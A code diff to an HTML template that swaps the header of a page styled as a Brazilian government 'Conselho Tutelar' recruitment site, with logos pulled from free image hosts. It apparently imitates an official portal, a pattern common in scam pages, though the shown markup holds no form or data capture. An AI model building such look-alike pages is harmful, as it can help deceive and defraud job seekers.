@@ -97,50 +97,35 @@ def index():
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 </head>
-<body class="flex flex-col min-h-screen bg-gray-50">
-    <!-- Government Header -->
-    <header class="bg-[#222222] text-white py-2">
-        <div class="container mx-auto flex justify-between items-center px-4">
-            <a class="font-bold text-sm" href="#">
-                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo Governo" class="h-6" />
-            </a>
-            <nav>
-                <ul class="flex space-x-4 text-[10px]">
-                    <li>
-                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
-                    </li>
-                    <li>
-                        <a class="hover:underline" href="#">TRANSPARÊNCIA</a>
-                    </li>
-                    <li>
-                        <a class="hover:underline" href="#">OUVIDORIA</a>
-                    </li>
-                </ul>
-            </nav>
-        </div>
-    </header>
-
-    <!-- Conselho Tutelar Header -->
-    <header class="bg-[#1451B4] text-white py-4">
-        <div class="container mx-auto px-4">
-            <div class="flex flex-col md:flex-row items-center justify-between">
-                <div class="flex items-center mb-4 md:mb-0">
-                    <img src="https://i.postimg.cc/5NvvmF2C/506e4525-b3e0-4703-85c5-24050ba28e3f-removalai-preview.png" alt="Logo Conselho Tutelar" class="h-12 mr-4" />
-                    <div>
-                        <h1 class="text-xl font-bold">CONSELHO TUTELAR</h1>
-                        <p class="text-sm text-blue-200">Proteção da Criança e do Adolescente</p>
-                        <p class="text-xs text-blue-300">Lei nº 8.069/90 - ECA</p>
-                    </div>
-                </div>
-                <div class="text-center md:text-right">
-                    <div class="bg-white text-[#1451B4] px-4 py-2 rounded-lg">
-                        <p class="text-sm font-bold">PROCESSO SELETIVO 2025</p>
-                        <p class="text-xs">2.847 vagas nacionais</p>
-                    </div>
+<body class="bg-white">
+    <!-- Government Header Image -->
+    <img src="https://i.ibb.co/yvTWdMd/IMG-3113.jpg" alt="Government header" class="w-full">
+    
+    <!-- Project Header -->
+    <div class="sticky-header">
+        <div class="container mx-auto px-4 border-b border-[#0000001a]">
+            <div class="flex items-center justify-between py-2">
+                <div class="flex items-center">
+                    <i class="fas fa-bars text-sm text-[#1451B4] mr-4 relative -top-1"></i>
+                    <p class="text-[14px] text-[#333333] -ml-[5px] leading-tight relative -top-1">
+                        Conselho Tutelar | Processo Seletivo
+                    </p>
                 </div>
             </div>
         </div>
-    </header>
+    </div>
+    <style>
+        .sticky-header {
+            position: sticky;
+            top: 0;
+            background-color: white;
+            z-index: 1000;
+            transition: box-shadow 0.3s ease;
+        }
+        .sticky-header.shadow {
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+    </style>
 
     <!-- Main Content -->
     <main class="flex-grow">
